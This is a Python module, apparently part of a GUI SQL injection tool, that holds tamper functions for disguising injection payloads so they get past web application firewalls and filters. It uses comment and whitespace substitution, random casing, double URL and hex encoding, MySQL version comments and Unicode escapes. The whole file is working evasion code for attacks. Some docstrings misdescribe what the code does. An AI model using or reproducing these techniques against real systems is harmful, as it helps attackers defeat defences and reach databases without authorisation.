"""
tamper.py - A module for payload tampering and evasion techniques.
Advanced obfuscation methods to bypass WAFs and filters.
"""

import random
import urllib.parse

def space_to_comment(payload: str) -> str:
    """
    Replaces spaces with inline comments.
    Example: 'SELECT id FROM users' -> 'SELECT/**/id/**/FROM/**/users'
    """
    return payload.replace(" ", "/**/")

def random_case(payload: str) -> str:
    """
    Applies random case to the payload.
    Example: 'SELECT' -> 'SeLeCt'
    """
    return "".join(random.choice([c.upper(), c.lower()]) for c in payload)

def space_to_random_whitespace(payload: str) -> str:
    """
    Replaces spaces with random whitespace characters.
    Example: 'SELECT' -> 'SELECT\t' or 'SELECT\n'
    """
    whitespace_chars = [' ', '\t', '\n', '\r', '\x0b', '\x0c']
    result = []
    for char in payload:
        if char == ' ':
            result.append(random.choice(whitespace_chars))
        else:
            result.append(char)
    return ''.join(result)

def inline_comments(payload: str) -> str:
    """
    Adds inline comments between SQL keywords.
    Example: 'SELECT * FROM' -> 'SELECT/**/* /**/FROM'
    """
    keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'ORDER', 'BY', 'INSERT', 'UPDATE', 'DELETE']
    result = payload
    for keyword in keywords:
        # Case-insensitive replacement
        import re
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        result = pattern.sub(lambda m: f"/*{random.randint(0,9999)}*/{m.group(0)}/*{random.randint(0,9999)}*/", result)
    return result

def double_url_encode(payload: str) -> str:
    """
    Applies double URL encoding to bypass filters.
    Example: '\'' -> '%2527' (single encode: %27, double: %2527)
    """
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def hex_encode_strings(payload: str) -> str:
    """
    Converts string literals to hex representation.
    Example: 'admin' -> 0x61646d696e
    """
    # Find strings in quotes and convert to hex
    import re
    def to_hex(match):
        text = match.group(1)
        hex_str = '0x' + text.encode().hex()
        return hex_str

    # Replace single-quoted strings
    result = re.sub(r"'([^']*)'", to_hex, payload)
    return result

def space_to_plus(payload: str) -> str:
    """
    Replaces spaces with plus signs (URL encoding alternative).
    Example: 'SELECT FROM' -> 'SELECT+FROM'
    """
    return payload.replace(" ", "+")

def random_comment_style(payload: str) -> str:
    """
    Uses random comment styles to obfuscate.
    Mixes /**/, --, # comment styles randomly.
    """
    comment_styles = ['/**/', '--\n', '# \n']
    result = payload.replace(" ", random.choice(comment_styles))
    return result

def version_comment(payload: str) -> str:
    """
    Uses MySQL version-specific comments.
    Example: 'SELECT' -> '/*!50000SELECT*/'
    """
    keywords = ['SELECT', 'FROM', 'WHERE', 'UNION', 'ORDER', 'BY']
    result = payload
    for keyword in keywords:
        import re
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        version = random.choice(['50000', '50001', '40000', '40100'])
        result = pattern.sub(f"/*!{version}{keyword}*/", result)
    return result

def unicode_escape(payload: str) -> str:
    """
    Converts characters to Unicode escape sequences.
    Example: 'SELECT' -> '\u0053\u0045\u004c\u0045\u0043\u0054'
    """
    # Only escape SQL keywords to keep payload readable
    keywords = ['SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR']
    result = payload
    for keyword in keywords:
        if keyword in result.upper():
            unicode_str = ''.join([f'\\u{ord(c):04x}' for c in keyword])
            result = result.replace(keyword, unicode_str)
            result = result.replace(keyword.lower(), unicode_str)
    return result

def space_to_hash_comment(payload: str) -> str:
    """
    Replaces spaces with hash comments (works in MySQL).
    Example: 'SELECT FROM' -> 'SELECT#comment\nFROM'
    """
    return payload.replace(" ", "#\n")

def mixed_obfuscation(payload: str) -> str:
    """
    Applies multiple obfuscation techniques randomly.
    Combines several methods for maximum evasion.
    """
    techniques = [
        lambda p: p.replace(" ", "/**/"),
        lambda p: "".join(random.choice([c.upper(), c.lower()]) for c in p),
        lambda p: p.replace(" ", "\t"),
    ]

    result = payload
    for _ in range(random.randint(2, 4)):
        technique = random.choice(techniques)
        result = technique(result)

    return result

def get_tamper_scripts():
    """
    Returns a dictionary of available tamper scripts for the GUI.
    The key is the user-facing name, and the value is the function itself.
    """
    return {
        "None": None,
        "Space to Comment": space_to_comment,
        "Random Case": random_case,
        "Space to Random Whitespace": space_to_random_whitespace,
        "Inline Comments": inline_comments,
        "Double URL Encode": double_url_encode,
        "Hex Encode Strings": hex_encode_strings,
        "Space to Plus": space_to_plus,
        "Version Comment (MySQL)": version_comment,
        "Unicode Escape": unicode_escape,
        "Space to Hash Comment": space_to_hash_comment,
        "Mixed Obfuscation": mixed_obfuscation,
    }
